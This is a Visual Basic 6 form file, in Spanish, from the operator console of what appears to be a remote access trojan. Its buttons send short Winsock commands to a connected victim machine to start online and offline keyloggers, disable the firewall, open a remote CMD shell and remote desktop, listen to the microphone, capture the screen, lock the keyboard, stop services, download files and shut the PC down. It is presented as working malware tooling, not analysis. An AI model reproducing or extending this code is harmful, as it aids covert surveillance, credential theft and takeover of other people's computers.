VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{F8180939-60A2-4494-B1BB-04818D7F640B}#1.0#0"; "LabelDegradado.ocx"
Begin VB.Form Form2 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Opciones de usuario"
   ClientHeight    =   5400
   ClientLeft      =   10770
   ClientTop       =   510
   ClientWidth     =   6375
   Icon            =   "Form2.frx":0000
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5400
   ScaleWidth      =   6375
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command13 
      Caption         =   "Bromas al usuario"
      Height          =   375
      Left            =   2160
      TabIndex        =   28
      Top             =   4320
      Width           =   1815
   End
   Begin VB.CommandButton Command12 
      Caption         =   "&Listar ventanas"
      Height          =   375
      Left            =   4080
      TabIndex        =   27
      Top             =   2400
      Width           =   1815
   End
   Begin VB.CommandButton Command27 
      Caption         =   "&Escuchar microfono"
      Height          =   375
      Left            =   360
      TabIndex        =   18
      Top             =   2880
      Width           =   1695
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   5400
      Top             =   240
   End
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   5400
      Top             =   720
   End
   Begin VB.CommandButton Command24 
      Caption         =   "&Escritorio remoto"
      Height          =   375
      Left            =   360
      TabIndex        =   16
      Top             =   2400
      Width           =   1695
   End
   Begin VB.CommandButton Command23 
      Caption         =   "&ShellRemota (CMD)"
      Height          =   375
      Left            =   2160
      TabIndex        =   15
      Top             =   2880
      Width           =   1815
   End
   Begin VB.CommandButton Command14 
      Caption         =   "&Bloquear Windows"
      Height          =   375
      Left            =   4080
      TabIndex        =   11
      Top             =   600
      Width           =   1815
   End
   Begin VB.Frame Frame1 
      Height          =   5175
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   6135
      Begin VB.CommandButton Command17 
         Caption         =   "&Cambiar fondo"
         Height          =   375
         Left            =   3960
         TabIndex        =   26
         Top             =   3720
         Width           =   1815
      End
      Begin VB.CommandButton Command15 
         Caption         =   "&Enviar mensaje"
         Height          =   375
         Left            =   2040
         TabIndex        =   25
         Top             =   3720
         Width           =   1815
      End
      Begin VB.CommandButton Command25 
         Caption         =   "&File Manager"
         Height          =   375
         Left            =   2040
         TabIndex        =   24
         Top             =   2280
         Width           =   1815
      End
      Begin VB.CommandButton Command11 
         Caption         =   "&Enviar teclas"
         Height          =   375
         Left            =   240
         TabIndex        =   23
         Top             =   3720
         Width           =   1695
      End
      Begin VB.CommandButton Command19 
         Caption         =   "&Parar servicio"
         Height          =   375
         Left            =   240
         TabIndex        =   22
         Top             =   4200
         Width           =   1695
      End
      Begin VB.CommandButton Command16 
         Caption         =   "&Descargar archivo"
         Height          =   375
         Left            =   3960
         TabIndex        =   21
         Top             =   2760
         Width           =   1815
      End
      Begin LabelDegradado.LabelDegrade LabelDegrade3 
         Height          =   255
         Left            =   240
         TabIndex        =   20
         Top             =   1920
         Width           =   5535
         _ExtentX        =   9763
         _ExtentY        =   450
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "&Opciones avanzadas de usuario"
         BackColor       =   255
         Transparente    =   0   'False
         ShadowDepth     =   0
         ShadowStyle     =   0
         ShadowColorStart=   0
         DegradadoColorStart=   8388608
      End
      Begin LabelDegradado.LabelDegrade LabelDegrade1 
         Height          =   255
         Left            =   240
         TabIndex        =   19
         Top             =   120
         Width           =   5535
         _ExtentX        =   9763
         _ExtentY        =   450
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "&Opciones simples de usuario"
         BackColor       =   255
         Transparente    =   0   'False
         ShadowDepth     =   0
         ShadowStyle     =   0
         ShadowColorStart=   0
         DegradadoColorStart=   8388608
      End
      Begin VB.CommandButton Command26 
         Caption         =   "&Keylogger online"
         Height          =   375
         Left            =   2040
         TabIndex        =   17
         Top             =   3240
         Width           =   1815
      End
      Begin ACTIVESKINLibCtl.Skin Skin1 
         Left            =   4800
         OleObjectBlob   =   "Form2.frx":5C12
         Top             =   0
      End
      Begin VB.CommandButton Command20 
         Caption         =   "&Informacion de usuario"
         Height          =   375
         Left            =   3960
         TabIndex        =   14
         Top             =   3240
         Width           =   1815
      End
      Begin VB.CommandButton Command1 
         Caption         =   "&Abrir lectora"
         Height          =   375
         Left            =   3960
         TabIndex        =   13
         Top             =   1440
         Width           =   1815
      End
      Begin VB.CommandButton Command10 
         Caption         =   "&Invertir Mouse"
         Height          =   375
         Left            =   3960
         TabIndex        =   12
         Top             =   960
         Width           =   1815
      End
      Begin VB.CommandButton Command2 
         Caption         =   "&Apagar Monitor"
         Height          =   375
         Left            =   240
         TabIndex        =   10
         Top             =   1440
         Width           =   1695
      End
      Begin VB.CommandButton Command8 
         Caption         =   "&Admin de procesos"
         Height          =   375
         Left            =   240
         TabIndex        =   9
         Top             =   960
         Width           =   1695
      End
      Begin VB.CommandButton Command3 
         Caption         =   "&Desactivar Firewall"
         Height          =   375
         Left            =   2040
         TabIndex        =   8
         Top             =   480
         Width           =   1815
      End
      Begin VB.CommandButton Command4 
         Caption         =   "&Bloquear Teclado"
         Height          =   375
         Left            =   2040
         TabIndex        =   7
         Top             =   1440
         Width           =   1815
      End
      Begin VB.CommandButton Command9 
         Caption         =   "&Mover Mouse"
         Height          =   375
         Left            =   2040
         TabIndex        =   6
         Top             =   960
         Width           =   1815
      End
      Begin VB.CommandButton Command5 
         Caption         =   "&Keylogger Offline"
         Height          =   375
         Left            =   240
         TabIndex        =   5
         Top             =   3240
         Width           =   1695
      End
      Begin VB.CommandButton Command22 
         Caption         =   "&Cerrar"
         Height          =   375
         Left            =   2040
         TabIndex        =   4
         Top             =   4680
         Width           =   1815
      End
      Begin VB.CommandButton Command7 
         Caption         =   "&Apagar PC"
         Height          =   375
         Left            =   240
         TabIndex        =   3
         Top             =   480
         Width           =   1695
      End
      Begin VB.CommandButton Command6 
         Caption         =   "&Desconectar Servidor"
         Height          =   375
         Left            =   3960
         TabIndex        =   2
         Top             =   4200
         Width           =   1815
      End
   End
   Begin VB.CommandButton Command21 
      Caption         =   "ScreenCapture"
      Height          =   375
      Left            =   360
      TabIndex        =   0
      Top             =   11160
      Width           =   5895
   End
   Begin MSComDlg.CommonDialog file 
      Left            =   240
      Top             =   360
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewSource As String, ByVal lpSobreexisting As Boolean) As Boolean
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpExistingFileName As String) As Boolean
Private Declare Function PathFileExists Lib "shlwapi" Alias "PathFileExistsA" (ByVal lppath As String) As Boolean
       
Option Explicit
        
Dim vIndex As Variant
Dim Index_n As Integer

Dim tiempo As Long

Dim corto As String
Dim aniCursor1 As clsAniCursor

Dim MyForm As FRMSIZE
Dim DesignX As Integer
Dim DesignY As Integer

Dim retro As Boolean
Dim x As Long


Private Sub Command1_Click()

If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    
    Form1.Winsock1(vIndex(0)).SendData "cd"
    
Else
    lista.List1.ListItems.Add , , "[Error al procesar comando - conexion perdida]"
    Unload Me
End If

End Sub

Private Sub Command10_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Form1.Winsock1(vIndex(0)).SendData "swp"
Else
    Unload Me
    lista.List1.ListItems.Add , , "[Error al procesar comando - conexion perdida]"
End If

End Sub

Private Sub Command11_Click()
Unload Foto
Unload fmanager
Unload fmensaje
Unload procesos
fteclas.show
End Sub

Private Sub Command12_Click()
ventanas.show
End Sub

Private Sub Command13_Click()
bromas.show
End Sub

Private Sub Command14_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Form1.Winsock1(vIndex(0)).SendData "aaa"
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If

End Sub

Private Sub Command15_Click()
Unload Foto
Unload fmanager
Unload procesos
Unload fteclas
fmensaje.show
fmensaje.SetFocus
End Sub

Private Sub Command16_Click()
downloader.show
End Sub

Private Sub Command17_Click()
fondo.show
End Sub

Private Sub Command19_Click()
services.show
End Sub

Private Sub Command2_Click()
If retro = True Or Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Form1.Winsock1(Index_n).SendData "mon"
Else
    retro = True
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida]"
    Unload Me
End If
End Sub

Private Sub Command20_Click()
If retro = True Or Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Form1.Winsock1(vIndex(0)).SendData "sta"
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If
End Sub

Private Sub Command21_Click()
Foto.show
End Sub

Private Sub Command22_Click()
Unload Me
End Sub

Private Sub Command23_Click()
Form4.show
End Sub

Private Sub Command24_Click()
Unload procesos
Unload fmanager
Unload fteclas
Unload fmensaje

If PathFileExists(App.path & "\sonido.wav") Then
    DeleteFile App.path & "\sonido.wav"
End If

Foto.show
aniCursor1.CursorOn Form4.hwnd

End Sub

Private Sub Command25_Click()
Unload Foto
Unload procesos
Unload fmensaje
Unload fteclas
fmanager.show
End Sub

Private Sub Command26_Click()
x = MsgBox("Esta seguro que desea activar durante 5 minutos el keylogger a tiempo real ?, tenga en cuenta que durante 5 minutos no podra enviar ningun otro comando al servidor, pasado estos minutos se restablecera todo a su normalidad", vbInformation + vbYesNo, "Aviso")
If Form1.Winsock1(vIndex(0)).state = sckConnected And x = vbYes Then
    
    Form1.Winsock1(vIndex(0)).SendData "kjw"
    
    tiempo = Minute(Now)
    
    If tiempo >= 55 Then
        tiempo = 5
    Else
        tiempo = tiempo + 5
    End If
    
    lista.List1.ListItems.Add , , "[ El keylogger online a hora esta activado durante 5 minutos ]"
    Form2.Enabled = False
    Timer2.Enabled = True
    
ElseIf Form1.Winsock1(vIndex(0)).state = sckConnected And x = vbNo Then
    Form2.SetFocus
    
Else

    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
    Unload Form4
    Unload Foto
    
End If

End Sub


Private Sub Command27_Click()
AUDIO.show
End Sub

Private Sub Command3_Click()

If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Form1.Winsock1(vIndex(0)).SendData "fir"
Else
    retro = True
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
End If
End Sub

Private Sub Command4_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Form1.Winsock1(vIndex(0)).SendData "blo"
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If
End Sub

Private Sub Command5_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then

    If PathFileExists(App.path & "\keylogger.txt") Then
        DeleteFile App.path & "\keylogger.txt"
    End If
    
    Form1.Winsock1(vIndex(0)).SendData "keylo"
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If
End Sub

Private Sub Command6_Click()

If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Form1.Winsock1(vIndex(0)).SendData "clo"
    Unload Me
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If

End Sub

Private Sub Command7_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Form1.Winsock1(vIndex(0)).SendData "off"
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If
End Sub

Private Sub Command8_Click()
procesos.show
End Sub

Private Sub Command9_Click()

If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Form1.Winsock1(vIndex(0)).SendData "mou"
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If

End Sub

Private Sub Form_Activate()
aniCursor1.CursorOn Command26.hwnd
aniCursor1.CursorOn Command1.hwnd
aniCursor1.CursorOn Command2.hwnd
aniCursor1.CursorOn Command3.hwnd
aniCursor1.CursorOn Command4.hwnd
aniCursor1.CursorOn Command5.hwnd
aniCursor1.CursorOn Command6.hwnd
aniCursor1.CursorOn Command7.hwnd
aniCursor1.CursorOn Command8.hwnd
aniCursor1.CursorOn Command9.hwnd
aniCursor1.CursorOn Command10.hwnd
aniCursor1.CursorOn Command11.hwnd
aniCursor1.CursorOn Command14.hwnd
aniCursor1.CursorOn Command15.hwnd
aniCursor1.CursorOn Command16.hwnd
aniCursor1.CursorOn Command17.hwnd
aniCursor1.CursorOn Command19.hwnd
aniCursor1.CursorOn Command20.hwnd
aniCursor1.CursorOn Command21.hwnd
aniCursor1.CursorOn Command22.hwnd
aniCursor1.CursorOn Command23.hwnd
aniCursor1.CursorOn Command24.hwnd
aniCursor1.CursorOn Command27.hwnd
aniCursor1.CursorOn Command25.hwnd
aniCursor1.CursorOn Command12.hwnd
aniCursor1.CursorOn Command27.hwnd
End Sub

Private Sub Form_Resize()
    Dim ScaleFactorX As Single, ScaleFactorY As Single

      If Not DoResize Then
         DoResize = True
         Exit Sub
      End If

      RePosForm = False
      ScaleFactorX = Me.Width / MyForm.Width
      ScaleFactorY = Me.Height / MyForm.Height
      Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
      MyForm.Height = Me.Height
      MyForm.Width = Me.Width
End Sub

Private Sub Form_Load()
Set aniCursor1 = New clsAniCursor

    'testeo de extension
aniCursor1.AniFile = App.path & "\sk\1.ani"

Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")
retro = False

'Skin1.LoadSkin App.path & "\sk\skin5.skn"
'Skin1.ApplySkin Form2.hwnd

Dim ScaleFactorX As Single, ScaleFactorY As Single

DesignX = 800
DesignY = 600
RePosForm = True
DoResize = False

Xtwips = Screen.TwipsPerPixelX
Ytwips = Screen.TwipsPerPixelY
Ypixels = Screen.Height / Ytwips
Xpixels = Screen.Width / Xtwips

ScaleFactorX = ((Xpixels / DesignX) / 2) - 100
ScaleFactorY = ((Ypixels / DesignY) / 2) - 100
ScaleMode = 1

Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
MyForm.Height = Me.Height
MyForm.Width = Me.Width

End Sub


Private Sub Timer1_Timer()

If Form1.LV.SelectedItem.Index > 0 Then
    Index_n = (Form1.LV.SelectedItem.Index)
    vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")
End If

If Form1.Winsock1(vIndex(0)).state = sckError Then
    Unload Form2
    Unload Form4
    Unload Me
End If

End Sub


Private Sub Timer2_Timer()
    
If tiempo = Minute(Now) Then
    Form2.Enabled = True
    Timer2.Enabled = False
End If

End Sub

